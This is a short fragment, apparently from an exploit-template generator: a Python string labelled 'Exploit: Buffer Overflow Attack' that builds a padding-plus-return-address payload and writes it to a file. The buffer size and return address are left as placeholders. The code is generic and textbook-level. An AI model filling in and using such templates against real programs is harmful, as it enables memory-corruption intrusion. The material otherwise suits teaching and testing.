"buffer_overflow": """
# Exploit: Buffer Overflow Attack
import struct

target_program = "buf_overflow.py"
buffer_size = {buffer_size}
return_address = {return_address}

def generate_payload(buffer_size, return_address):
    payload = b"A" * buffer_size + struct.pack("<I", return_address)
    return payload

if __name__ == "__main__":
    payload = generate_payload(buffer_size, return_address)
    with open("payload.bin", "wb") as f:
        f.write(payload)
    print("[+] Payload written to 'payload.bin'")
"""